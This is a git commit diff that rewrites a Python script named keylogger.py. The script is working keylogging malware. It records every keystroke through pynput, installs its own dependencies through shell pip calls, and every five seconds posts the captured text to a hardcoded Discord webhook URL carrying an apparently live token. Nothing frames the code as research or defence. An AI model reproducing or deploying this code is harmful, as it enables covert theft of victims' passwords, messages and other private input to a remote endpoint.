d03e2b73e24d34d0a4c078706b025d8eb67054fd
PaiusZ <110635907+Paius-George@users.noreply.github.com>
2025-11-25 21:54:07 +0200

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,62 +1,49 @@
+import os
+import threading
+from pynput import keyboard
+import requests
 
+try:
+    import pynput
+except ImportError:
+    os.system("pip install pynput requests")
 
 webhook_url = "https://discord.com/api/webhooks/1442428343965188129/lSoN-8yNzw40_aU3l8ASFB6Cb4N4YYYY-WJ2PFpL4PwxxUxmocwRnnFjEK5h0ZNjsqG0"
 
-import os
-try:
-    os.system("pip install pynput requests")
-except:
-    pass
-try:
-    os.system("python -m pip install pynput requests")
-except:
-    pass
-try:
-    os.system("py -m pip install pynput requests")
-except:
-    pass
-
-
-from pynput import keyboard
-import requests
-import threading
-
 text = ""
-
 time_interval = 5
 
 def send_data():
-    data = {
-        "content": text,
-        "title": "Key Logger"
-    }
-    requests.post(webhook_url, json=data)
+    global text
+    if len(text) > 1:
+        data = {
+            "content": text,
+            "title": "x"
+        }
+        try:
+            requests.post(webhook_url, json=data)
+            text = "" 
+        except Exception as e:
+            print(f"Eroare la trimitere: {e}")
+
+    # Repornim timer-ul
     timer = threading.Timer(time_interval, send_data)
     timer.start()
 
 def on_press(key):
     global text
-    if key == keyboard.Key.space:
-        text += " "
-    elif key == keyboard.Key.enter:
-        text += "\n"
-    elif key == keyboard.Key.shift:
-        pass
-    elif key == keyboard.Key.tab:
-        text += "\t"
-    elif key == keyboard.Key.backspace:
-        if len(text) > 0:
-            text = text[:-1]
-        else:
-            pass
-    elif key == keyboard.Key.esc:
-        return False
-    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-        pass
-    else:
-        text += str(key).strip("'")
-
+    try:
+        text += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            text += " "
+        elif key == keyboard.Key.enter:
+            text += "\n"
+        elif key == keyboard.Key.tab:
+            text += "\t"
+        elif key == keyboard.Key.backspace:
+            if len(text) > 0:
+                text = text[:-1]
 with keyboard.Listener(on_press=on_press) as listener:
-    send_data()
-
+    send_data() 
     listener.join()
